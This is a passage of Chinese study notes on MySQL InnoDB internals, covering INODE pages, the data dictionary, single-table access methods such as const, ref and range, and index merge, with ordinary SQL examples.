src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130205514.png" alt="image-20211130205512195"></p><p>每个段对应的INODE Entry结构会集中存放到⼀个类型 位INODE的⻚中，如果表空间中的段特别多，则会有多 个INODE Entry结构，可能⼀个⻚放不下，这些INODE类型 的⻚会组成两种列表： SEG_INODES_FULL链表，该链表中的INODE类型的⻚⾯ 都已经被INODE Entry结构填充满了，没空闲空间存放 额外的INODE Entry了。 SEG_INODES_FULL链表，该链表中的INODE类型的⻚⾯ 都已经仍有空闲空间来存放INODE Entry结构</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130210859.png" alt="image-20211130210858131"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130211050.png" alt="image-20211130211043396"></p><p><strong>SEG_INODES_FULL链表和SEG_INODES_FREE链表</strong></p><p>这两个链表的基节 点就存储在File Space Header⾥边，也就是说这两个链表的基 节点的位置是固定的，所以我们可以很轻松的访问到这两个链表。以 后每当我们新创建⼀个段（创建索引时就会创建段）时，都会创建⼀ 个INODE Entry结构与之对应，存储INODE Entry的⼤致过程就 是这样的： 先看看SEG_INODES_FREE链表是否为空，如果不为空，直接 从该链表中获取⼀个节点，也就相当于获取到⼀个仍有空闲空 间的INODE类型的⻚⾯，然后把该INODE Entry结构防到该 ⻚⾯中。当该⻚⾯中⽆剩余空间时，就把该⻚放 到SEG_INODES_FULL链表中。</p><p>如果SEG_INODES_FREE链表为空，则需要从表空间的 FREE_FRAG链表中申请⼀个⻚⾯，修改该⻚⾯的类型 为INODE，把该⻚⾯放到SEG_INODES_FREE链表中，与此同 时把该INODE Entry结构放⼊该⻚⾯。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129174603.png" alt="image-20211129174450680"></p><p><strong>Page Header部分</strong></p><p><strong>PAGE_BTR_SEG_LEAF 10字节 B+树叶⼦段的头部信息，仅在 B+树的根⻚定义</strong></p><p><strong>PAGE_BTR_SEG_TOP 10字节 B+树⾮叶⼦段的头部信息，仅在 B+树的根⻚定义</strong></p><p>其中的PAGE_BTR_SEG_LEAF和PAGE_BTR_SEG_TOP都占⽤10个字 节，它们其实对应⼀个叫Segment Header的结构，该结构图示如 下：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130212317.png" alt="image-20211130212315261"></p><p><strong>这样⼦就很清晰了，PAGE_BTR_SEG_LEAF记录着叶⼦节点段对应 的INODE Entry结构的地址是哪个表空间的哪个⻚⾯的哪个偏移 量，PAGE_BTR_SEG_TOP记录着⾮叶⼦节点段对应的INODE Entry结构的地址是哪个表空间的哪个⻚⾯的哪个偏移量。这样⼦索 引和其对应的段的关系就建⽴起来了。不过需要注意的⼀点是，因为 ⼀个索引只对应两个段，所以只需要在索引的根⻚⾯中记录这两个结 构即可。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130212829.png" alt="image-20211130212828043"></p><p>系统表空间和独⽴表空间的前三个⻚⾯（⻚号分别 为0、1、2，类型分别是FSP_HDR、IBUF_BITMAP、INODE）的类 型是⼀致的，只是⻚号为3～7的⻚⾯是系统表空间特有的，我们来 看⼀下这些多出来的⻚⾯都是⼲啥使的</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130213635.png" alt="image-20211130213633335"></p><p>除了这⼏个记录系统属性的⻚⾯之外，系统表空间的extent 1和 extent 2这两个区，也就是⻚号从64~127这128个⻚⾯被称 为Doublewrite buffer，也就是双写缓冲区。不过上述的⼤部分 知识都涉及到了事务和多版本控制的问题</p><p><strong>先说说下面这个这个页面类型为SYS的页面</strong></p><p><strong>7 SYS Data Dictionary Header 数据字典头部信息</strong></p><p><strong>MySQL除了保存着我们插⼊的⽤ 户数据之外，还需要保存许多额外的信息：</strong></p><p>某个表属于哪个表空间，表⾥边有多少列</p><p>表对应的每⼀个列的类型是什么</p><p>该表有多少索引，每个索引对应哪⼏个字段</p><p>该索引对应的根 ⻚⾯在哪个表空间的哪个⻚⾯</p><p>该表有哪些外键，外键对应哪个表的哪些列</p><p>某个表空间对应⽂件系统上⽂件路径是什么 balabala … 还有好多，不⼀⼀列举了</p><p><strong>InnoDB存储引擎特意定义了⼀些列的内部 系统表（internal system table）来记录这些这些元数据</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130214214.png" alt="image-20211130214212746"></p><p><strong>这些系统表也被称为数据字典，它们都是以B+树的形式保存在系统 表空间的某些⻚⾯中，其中 SYS_TABLES、SYS_COLUMNS、SYS_INDEXES、SYS_FIELDS这 四个表尤其重要，称之为基本系统表（basic system tables）</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130231240.png" alt="image-20211130231238857"></p><p>这4个表是表中之表，那这4个表的元数据去哪⾥获取呢？ 没法搞了，只能把这4个表的元数据，就是它们有哪些列、哪些索引 等信息硬编码到代码中，然后设计InnoDB的⼤叔⼜拿出⼀个固定的 ⻚⾯来记录这4个表的聚簇索引和⼆级索引对应的B+树位置，这个⻚ ⾯就是⻚号为7的⻚⾯，类型为SYS，记录了Data Dictionary Header，也就是数据字典的头部信息。除了这4个表的5个索引的根 ⻚⾯信息外，这个⻚号为7的⻚⾯还记录了整个InnoDB存储引擎的 ⼀些全局属性</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130233437.png" alt="image-20211130233435653"></p><p>可以看到这个⻚⾯⾥竟然有Segment Header部分，意味着设计 InnoDB的⼤叔把这些有关数据字典的信息当成⼀个段来分配存储空 间，我们就姑且称之为数据字典段吧。</p><p>Data Dictionary Header部分的 各个字段：</p><p>Max Row ID：我们说过如果我们不显式的为表定义主键，⽽ 且表中也没有UNIQUE索引，那么InnoDB存储引擎会默认为我 们⽣成⼀个名为row_id的列作为主键。因为它是主键，所以 每条记录的row_id列的值不能重复。原则上只要⼀个表中的 row_id列不重复就可以了，也就是说表a和表b拥有⼀样的 row_id列也没啥关系，不过设计InnoDB的⼤叔只提供了这 个Max Row ID字段，不论哪个拥有row_id列的表插⼊⼀条 记录时，该记录的row_id列的值就是Max Row ID对应的 值，然后再把Max Row ID对应的值加1，也就是说这个Max Row ID是全局共享的。</p><p>Max Table ID：InnoDB存储引擎中的所有的表都对应⼀个 唯⼀的ID，每次新建⼀个表时，就会把本字段的值作为该表的 ID，然后⾃增本字段的值。</p><p>Max Index ID：InnoDB存储引擎中的所有的索引都对应⼀ 个唯⼀的ID，每次新建⼀个索引时，就会把本字段的值作为该 索引的ID，然后⾃增本字段的值。</p><p>Max Space ID：InnoDB存储引擎中的所有的表空间都对应 ⼀个唯⼀的ID，每次新建⼀个表空间时，就会把本字段的值作 为该表空间的ID，然后⾃增本字段的值。</p><p>Mix ID Low(Unused)：这个字段没啥⽤，跳过。</p><p>Root of SYS_TABLES clust index：本字段代 表SYS_TABLES表聚簇索引的根⻚⾯的⻚号。</p><p>Root of SYS_TABLE_IDS sec index：本字段代 表SYS_TABLES表为ID列建⽴的⼆级索引的根⻚⾯的⻚号。</p><p>Root of SYS_COLUMNS clust index：本字段代 表SYS_COLUMNS表聚簇索引的根⻚⾯的⻚号。</p><p>Root of SYS_INDEXES clust： index本字段代 表SYS_INDEXES表聚簇索引的根⻚⾯的⻚号。</p><p>Root of SYS_FIELDS clust index：本字段代 表SYS_FIELDS表聚簇索引的根⻚⾯的⻚号。</p><p>Unused：这4个字节没⽤，跳过。</p><p><strong>information_schema系统数据库</strong></p><p>需要注意⼀点的是，⽤户是不能直接访问InnoDB的这些内部系统表 的，除⾮你直接去解析系统表空间对应⽂件系统上的⽂件。不过设计 InnoDB的⼤叔考虑到查看这些表的内容可能有助于⼤家分析问题， 所以在系统数据库information_schema中提供了⼀些以 innodb_sys开头的表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; USE information_schema;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SHOW TABLES LIKE &#39;innodb_sys%&#39;;</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| Tables_in_information_schema (innodb_sys%) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| INNODB_SYS_DATAFILES |</span><br><span class="line">| INNODB_SYS_VIRTUAL |</span><br><span class="line">| INNODB_SYS_INDEXES |</span><br><span class="line">| INNODB_SYS_TABLES |</span><br><span class="line">| INNODB_SYS_FIELDS |</span><br><span class="line">| INNODB_SYS_TABLESPACES |</span><br><span class="line">| INNODB_SYS_FOREIGN_COLS |</span><br><span class="line">| INNODB_SYS_COLUMNS |</span><br><span class="line">| INNODB_SYS_FOREIGN |</span><br><span class="line">| INNODB_SYS_TABLESTATS |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">10 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>在information_schema数据库中的这些以INNODB_SYS开头的表 并不是真正的内部系统表（内部系统表就是我们上边唠叨的以SYS开 头的那些表），⽽是在存储引擎启动时读取这些以SYS开头的系统 表，然后填充到这些以INNODB_SYS开头的表中。以INNODB_SYS开 头的表和以SYS开头的表中的字段并不完全⼀样。</p><h1 id="条条大路通罗马-——-单表访问方法"><a href="#条条大路通罗马-——-单表访问方法" class="headerlink" title="条条大路通罗马 —— 单表访问方法"></a>条条大路通罗马 —— 单表访问方法</h1><p>⼀条查询语句进⾏语法解析 之后就会被交给查询优化器来进⾏优化，优化的结果就是⽣成⼀个所 谓的执⾏计划，这个执⾏计划表明了应该使⽤哪些索引进⾏查询，表 之间的连接顺序是啥样的，最后会按照执⾏计划中的步骤调⽤存储引 擎提供的⽅法来真正的执⾏查询，并将查询结果返回给⽤户。</p><p>查询的执⾏⽅式⼤致分为下边两种：</p><ol><li><p>使⽤全表扫描进⾏查询</p><p>这种执⾏⽅式很好理解，就是把表的每⼀⾏记录都扫⼀遍嘛， 把符合搜索条件的记录加⼊到结果集就完了。不管是啥查询都 可以使⽤这种⽅式执⾏，当然，这种也是最笨的执⾏⽅式。</p></li><li><p>使⽤索引进⾏查询</p><p>因为直接使⽤全表扫描的⽅式执⾏查询要遍历好多记录，所以 代价可能太⼤了。如果查询语句中的搜索条件可以使⽤到某个 索引，那直接使⽤索引来执⾏查询可能会加快查询执⾏的时 间。使⽤索引来执⾏查询的⽅式五花⼋⻔，⼜可以细分为许多 种类：</p><ul><li>针对主键或唯⼀⼆级索引的等值查询</li><li>针对普通⼆级索引的等值查询</li><li>针对索引列的范围查询</li><li>直接扫描整个索引</li></ul></li></ol><p>MySQL执⾏查询语句的⽅式称之为访问⽅法或者访问类型。</p><p>同⼀个查询语句可能可以使⽤多种不同的访问⽅法来执⾏。</p><p><strong>通过主键列来定位⼀条记录，MySQL会直接利⽤主键值在聚簇索引中定位对应的⽤户记录。</strong></p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211201000137731.png" alt="image-20211201000137731"></p><p>B+树本来就是⼀个矮矮的⼤胖⼦，所以这样根据主键值定位⼀ 条记录的速度贼快。根据唯⼀⼆级索引列来定位⼀条记 录的速度也是贼快的。</p><p><strong>const</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key2 &#x3D; 3841;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205141626.png" alt="image-20211201000408269"></p><p>设计MySQL的⼤叔认为通过主键或者唯⼀⼆级索引列与常数的等值⽐ 较来定位⼀条记录是像坐⽕箭⼀样快的，所以他们<strong>把这种通过主键或 者唯⼀⼆级索引列来定位⼀条记录的访问⽅法定义为：const，</strong>意思 是常数级别的，代价是可以忽略不计的。不过这种const访问⽅法只 能在主键列或者唯⼀⼆级索引列和⼀个常数进⾏等值⽐较时才有效， 如果主键或者唯⼀⼆级索引是由多个列构成的话，索引中的每⼀个列 都需要与常数进⾏等值⽐较，这个const访问⽅法才有效（这是因为 只有该索引中全部列都采⽤等值⽐较才可以定位唯⼀的⼀条记录）。</p><p><strong>ref</strong></p><p><strong>对于唯⼀⼆级索引来说，查询该列为NULL值的情况⽐较特殊</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key2 IS NULL;</span><br></pre></td></tr></table></figure><p><strong>唯⼀⼆级索引列并不限制NULL值的数量，所以上述语句可能访 问到多条记录，也就是说上边这个语句不可以使⽤const访问⽅法来 执⾏。</strong></p><p><strong>普通⼆级索引并不限 制索引列值的唯⼀性，所以可能找到多条对应的记录，也就是说使⽤ ⼆级索引来执⾏查询的代价取决于等值匹配到的⼆级索引记录条数。采⽤⼆级索引来执⾏查询的访问⽅法称为：ref。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201085300.png" alt="image-20211201085237092"></p><p><strong>⼆级索引列值为NULL的情况</strong></p><p><strong>不论是普通的⼆级索引，还是唯⼀⼆级索引，它们的索引列对 包含NULL值的数量并不限制，所以我们采⽤key IS NULL这 种形式的搜索条件最多只能使⽤ref的访问⽅法，⽽不 是const的访问⽅法。</strong></p><p>但是如果最左边的连续索引列并<strong>不全部是等值⽐较</strong>的话，它的 访问⽅法就<strong>不能称为ref</strong>了，⽐⽅说这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key_part1 &#x3D;</span><br><span class="line">&#39;god like&#39; AND key_part2 &gt; &#39;legendary&#39;;</span><br></pre></td></tr></table></figure><p><strong>ref_or_null</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_demo WHERE key1 &#x3D; &#39;abc&#39; OR</span><br><span class="line">key1 IS NULL;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201090016.png" alt="image-20211201090014080"></p><p><strong>range</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key2 IN (1438,</span><br><span class="line">6328) OR (key2 &gt;&#x3D; 38 AND key2 &lt;&#x3D; 79);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201090646.png" alt="image-20211201090645411"></p><p>我们可以把那种索引列等值匹配的情况称之为单点区间，上边所说的 范围1和范围2都可以被称为单点区间，像范围3这种的我们可以称为 连续范围区间。</p><p><strong>index</strong></p><p>这种采⽤遍历⼆级索引记录的执⾏⽅式称之 为：index</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT key_part1, key_part2, key_part3 FROM</span><br><span class="line">single_table WHERE key_part2 &#x3D; &#39;abc&#39;;</span><br></pre></td></tr></table></figure><p>它的查询列表只有3个列：key_part1, key_part2, key_part3，⽽索引idx_key_part⼜包含这三个列。 搜索条件中只有key_part2列。这个列也包含在索 引idx_key_part中。</p><p>也就是说我们可以直接通过遍历idx_key_part索引的叶⼦节点的 记录来⽐较key_part2 = ‘abc’这个条件是否成⽴，把匹配成功 的⼆级索引记录的key_part1, key_part2, key_part3列的值直 接加到结果集中就⾏了。由于⼆级索引记录⽐聚簇索记录⼩的多（聚 簇索引记录要存储所有⽤户定义的列以及所谓的隐藏列，⽽⼆级索引 记录只需要存放索引列和主键），⽽且这个过程也不⽤进⾏回表操 作，所以直接遍历⼆级索引⽐直接遍历聚簇索引的成本要⼩很多。</p><p><strong>all</strong></p><p>最直接的查询执⾏⽅式就是我们已经提了⽆数遍的全表扫描，对于 InnoDB表来说也就是<strong>直接扫描聚簇索引</strong>，设计MySQL的⼤叔把这种 使⽤全表扫描执⾏查询的⽅式称之为：all。</p><p>*<em>注意 *</em></p><p><strong>二级索引+回表</strong></p><p>ref的访问⽅ 法⼀般⽐range好，但这也不总是⼀定的，也可能采⽤ref访问⽅法 的那个索引列的值为特定值的⾏数特别多</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key1 &#x3D; &#39;abc&#39; AND</span><br><span class="line">key2 &gt; 1000;</span><br></pre></td></tr></table></figure><p>假设优化器决 定使⽤idx_key1索引进⾏查询，那么整个查询过程可以分为两个步 骤：</p><p>步骤1：使⽤⼆级索引定位记录的阶段，也就是根据条件key1 = ‘abc’从idx_key1索引代表的B+树中找到对应的⼆级索引 记录。</p><p>步骤2：回表阶段，也就是根据上⼀步骤中找到的记录的主键 值进⾏回表操作，也就是到聚簇索引中找到对应的完整的⽤户 记录，再根据条件key2 &gt; 1000到完整的⽤户记录继续过 滤。将最终符合过滤条件的记录返回给⽤户。</p><p><strong>因为⼆级索引的节点中的记录只包 含索引列和主键，所以在步骤1中使⽤idx_key1索引进⾏查询时只 会⽤到与key1列有关的搜索条件，其余条件，⽐如key2 &gt; 1000这 个条件在步骤1中是⽤不到的，只有在步骤2完成回表操作后才能继 续针对完整的⽤户记录中继续过滤。</strong></p><p><strong>明确range访问⽅法使⽤的范围区间</strong></p><p>其实对于B+树索引来说，只要索引列和常数使⽤=、&lt;=&gt;、IN、NOT IN、IS NULL、IS NOT NULL、&gt;、&lt;、&gt;=、&lt;=、BETWEEN、!=（不等于也可以写成&lt;&gt;）或 者LIKE操作符连接起来，就可以产⽣⼀个所谓的区间</p><p>IN操作符的效果和若⼲个等值匹配操作符<code>=</code>之间⽤<code>OR</code>连接起来 是⼀样的，也就是说会产⽣多个单点区间，⽐如下边这两个语句的 效果是⼀样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key2 IN (1438, 6328); </span><br><span class="line"></span><br><span class="line">SELECT * FROM single_table WHERE key2 &#x3D; 1438 OR key2 &#x3D; 6328</span><br></pre></td></tr></table></figure><p><strong>有的搜索条件⽆法使⽤索引的情况</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key2 &gt; 100 AND</span><br><span class="line">common_field &#x3D; &#39;abc&#39;;</span><br></pre></td></tr></table></figure><p>请注意，这个查询语句中能利⽤的索引只有idx_key2⼀个， ⽽idx_key2这个⼆级索引的记录中⼜不包含common_field这个字 段，所以在使⽤⼆级索引idx_key2定位定位记录的阶段⽤不 到common_field = ‘abc’这个条件，这个条件是在回表获取了完 整的⽤户记录后才使⽤的，⽽范围区间是为了到索引中取记录中提出 的概念，所以在确定范围区间的时候不需要考虑common_field = ‘abc’这个条件，我们在为某个索引确定范围区间的时候只需要把⽤ 不到相关索引的搜索条件替换为TRUE就好了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key2 &gt; 100 OR</span><br><span class="line">common_field &#x3D; &#39;abc&#39;;</span><br><span class="line">&#x3D;</span><br><span class="line">SELECT * FROM single_table WHERE key2 &gt; 100 OR</span><br><span class="line">TRUE;</span><br><span class="line">&#x3D;</span><br><span class="line">SELECT * FROM single_table WHERE TRUE;</span><br></pre></td></tr></table></figure><p>这也就说说明如果我们强制使⽤idx_key2执⾏查询的话，对应 的范围区间就是(-∞, +∞)，也就是需要将全部⼆级索引的记录进⾏ 回表，这个代价肯定⽐直接全表扫描都⼤了。也就是说⼀个使⽤到索 引的搜索条件和没有使⽤该索引的搜索条件使⽤OR连接起来后是⽆ 法使⽤该索引的。</p><p><strong>分析复杂查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE</span><br><span class="line">(key1 &gt; &#39;xyz&#39; AND key2 &#x3D; 748 ) OR</span><br><span class="line">(key1 &lt; &#39;abc&#39; AND key1 &gt; &#39;lmn&#39;) OR</span><br><span class="line">(key1 LIKE &#39;%suf&#39; AND key1 &gt; &#39;zzz&#39; AND</span><br><span class="line">(key2 &lt; 8000 OR common_field &#x3D; &#39;abc&#39;)) ;</span><br></pre></td></tr></table></figure><p>这个查询的搜索条件涉及到了key1、key2、common_field 这3个列，然后key1列有普通的⼆级索引idx_key1，key2列 有唯⼀⼆级索引idx_key2。<strong>把那些⽤不到该索引的搜索条件暂时移除 掉，移除⽅法也简单，直接把它们替换为TRUE就好 了</strong>。</p><p><strong>假设我们使⽤idx_key1执⾏查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(key1 &gt; &#39;xyz&#39; AND TRUE ) OR</span><br><span class="line">(key1 &lt; &#39;abc&#39; AND key1 &gt; &#39;lmn&#39;) OR</span><br><span class="line">(TRUE AND key1 &gt; &#39;zzz&#39; AND (TRUE OR</span><br><span class="line">TRUE))</span><br><span class="line">&#x3D; </span><br><span class="line">(key1 &gt; &#39;xyz&#39;) OR</span><br><span class="line">(key1 &lt; &#39;abc&#39; AND key1 &gt; &#39;lmn&#39;) OR</span><br><span class="line">(key1 &gt; &#39;zzz&#39;)</span><br><span class="line"></span><br><span class="line"># 因为符合key1 &lt; &#39;abc&#39; AND key1 &gt; &#39;lmn&#39;永远为FALSE，所以上边的搜索条件可以被写成这样：</span><br><span class="line"></span><br><span class="line">(key1 &gt; &#39;xyz&#39;) OR (key1 &gt; &#39;zzz&#39;)</span><br><span class="line">&#x3D;</span><br><span class="line">key1 &gt; xyz</span><br></pre></td></tr></table></figure><p>上边那个有⼀坨搜索条件的查询语句如果使⽤ idx_key1 索引执⾏查询的话，需要把满⾜key1 &gt; xyz的⼆级索引记录都取出来，然后拿着这些记录 的id再进⾏回表，得到完整的⽤户记录之后再使⽤ 其他的搜索条件进⾏过滤。</p><p><strong>假设我们使⽤idx_key2执⾏查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(TRUE AND key2 &#x3D; 748 ) OR</span><br><span class="line">(TRUE AND TRUE) OR</span><br><span class="line">(TRUE AND TRUE AND (key2 &lt; 8000 OR</span><br><span class="line">TRUE))</span><br><span class="line">&#x3D;</span><br><span class="line">TRUE</span><br></pre></td></tr></table></figure><p><strong>这个结果也就意味着如果我们要使⽤idx_key2索 引执⾏查询语句的话，需要扫描idx_key2⼆级索 引的所有记录，然后再回表，这不是得不偿失么， 所以这种情况下不会使⽤idx_key2索引的。</strong></p><p><strong>索引合并</strong></p><p>在⼀个 查询中使⽤到多个⼆级索引，设计MySQL的⼤叔把这种使⽤到多个索 引来完成⼀次查询的执⾏⽅法称之为：index merge，具体的索引 合并算法有下边三种。</p><p>Intersection合并 Intersection翻译过来的意思是交集。这⾥是说某个查询可以使 ⽤多个⼆级索引，将从多个⼆级索引中查询到的结果取交集，⽐⽅说 下边这个查询：</p><p>从idx_key1⼆级索引对应的B+树中取出key1 = ‘a’的相关 记录。 从idx_key3⼆级索引对应的B+树中取出key3 = ‘b’的相关 记录。 ⼆级索引的记录都是由索引列 + 主键构成的，所以我们可以 计算出这两个结果集中id值的交集。 按照上⼀步⽣成的id值列表进⾏回表操作，也就是从聚簇索引 中把指定id值的完整⽤户记录取出来，返回给⽤户。</p><p>虽然读取多个⼆级索引⽐读取⼀个⼆级索引消耗性能，但是读取⼆级 索引的操作是顺序I/O，⽽回表操作是随机I/O，所以如果只读取⼀ 个⼆级索引时需要回表的记录数特别多，⽽读取多个⼆级索引之后取 交集的记录数⾮常少，当节省的因为回表⽽造成的性能损耗⽐访问多 个⼆级索引带来的性能损耗更⾼时，读取多个⼆级索引后取交集⽐只 读取⼀个⼆级索引的成本更低。</p><p><strong>MySQL在某些特定的情况下才可能会使⽤到Intersection索引合 并：</strong></p><p><strong>情况⼀：⼆级索引列是等值匹配的情况，对于联合索引来说， 在联合索引中的每个列都必须等值匹配，不能出现只出现匹配 部分列的情况。</strong></p><p>⽽下边这两个查询就不能进⾏Intersection索引合并：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key1 &gt; &#39;a&#39; AND key_part1 &#x3D; &#39;a&#39; AND key_part2 &#x3D; &#39;b&#39; AND key_part3 &#x3D; &#39;c&#39;; </span><br><span class="line"></span><br><span class="line">SELECT * FROM single_table WHERE key1 &#x3D; &#39;a&#39; AND key_part1 &#x3D; &#39;a&#39;;</span><br></pre></td></tr></table></figure><p>第⼀个查询是因为对key1进⾏了范围匹配，第⼆个查询是因为联合索引idx_key_part中的key_part2列并没有出现在搜索条件中，所以这两个查询不能进⾏Intersection索引合并。</p><p><strong>情况⼆：主键列可以是范围匹配</strong></p><p>⽐⽅说下边这个查询可能⽤到主键和idx_key_part进 ⾏Intersection索引合并的操作： SELECT * FROM single_table WHERE id &gt; 100 AND key1 = ‘a’;</p><p><strong>之所以在⼆级索引列都是等值匹配的情况下才可能使 ⽤Intersection索引合并，是因为只有在这种情况下根据⼆级索 引查询出的结果集是按照主键值排序的。求交集的过程就是这样：逐个取出这两个结果集中最⼩的主键 值，如果两个值相等，则加⼊最后的交集结果中，否则丢弃当前较⼩ 的主键值，再取该丢弃的主键值所在结果集的后⼀个主键值来⽐较， 直到某个结果集中的主键值⽤完了。如果从各个⼆级索引中查询出的结果集并不是按照主键排序的话， 那就要先把结果集中的主键值排序完再来做上边的那个过程，就⽐较 耗时了。按照有序的主键值去回表取记录有个专有名词⼉，叫：Rowid Ordered Retrieval，简称ROR，以后⼤家在某些地⽅⻅到这个 名词⼉就眼熟了。</strong></p><p>上边说的情况⼀和情况⼆只是发⽣Intersection索引合并 的必要条件，不是充分条件。也就是说即使情况⼀、情况⼆成⽴，也 不⼀定发⽣Intersection索引合并，这得看优化器的⼼情。优化 器在下边两个条件满⾜的情况下才趋向于使⽤Intersection索引 合并： <strong>单独根据搜索条件从某个⼆级索引中获取的记录数太多，导致 回表开销太⼤ 。通过Intersection索引合并后需要回表的记录数⼤⼤减少</strong></p><p>Intersection是交集的意思，这适⽤于使⽤不同索引的搜索条件 之间使⽤AND连接起来的情况；Union是并集的意思，适⽤于使⽤不 同索引的搜索条件之间使⽤OR连接起来的情况。</p><p><strong>Union合并</strong></p><p><strong>情况⼀：⼆级索引列是等值匹配的情况，对于联合索引来说， 在联合索引中的每个列都必须等值匹配，不能出现只出现匹配 部分列的情况。</strong></p><p>⽽下边这两个查询就不能进⾏Union索引合并：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key1 &gt; &#39;a&#39; OR (key_part1 &#x3D; &#39;a&#39; AND key_part2 &#x3D; &#39;b&#39; AND key_part3 &#x3D; &#39;c&#39;); </span><br><span class="line">SELECT * FROM single_table WHERE key1 &#x3D; &#39;a&#39; OR key_part1 &#x3D; &#39;a&#39;;</span><br></pre></td></tr></table></figure><p><strong>情况⼆：主键列可以是范围匹配</strong></p><p><strong>情况三：使⽤Intersection索引合并的搜索条件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key_part1 &#x3D; &#39;a&#39; AND key_part2 &#x3D; &#39;b&#39; AND key_part3 &#x3D; &#39;c&#39; OR (key1 &#x3D; &#39;a&#39; AND key3 &#x3D; &#39;b&#39;);</span><br></pre></td></tr></table></figure><p>优化器可能采⽤这样的⽅式来执⾏这个查询： 先按照搜索条件key1 = ‘a’ AND key3 = ‘b’从索 引idx_key1和idx_key3中使⽤Intersection索引合 并的⽅式得到⼀个主键集合。 再按照搜索条件key_part1 = ‘a’ AND key_part2 = ‘b’ AND key_part3 = ‘c’从联合索 引idx_key_part中得到另⼀个主键集合。 采⽤Union索引合并的⽅式把上述两个主键集合取并集， 然后进⾏回表操作，将结果返回给⽤户。</p><p>优化器在下边两个条件满⾜的情况下才趋向于 使⽤Union索引合并： 单独根据搜索条件从某个⼆级索引中获取的记录数⽐较少。 通过Intersection索引合并后需要回表的记录数⼤⼤减少</p><p><strong>Sort-Union合并</strong></p><p>Union索引合并的使⽤条件太苛刻，必须保证各个⼆级索引列在进⾏ 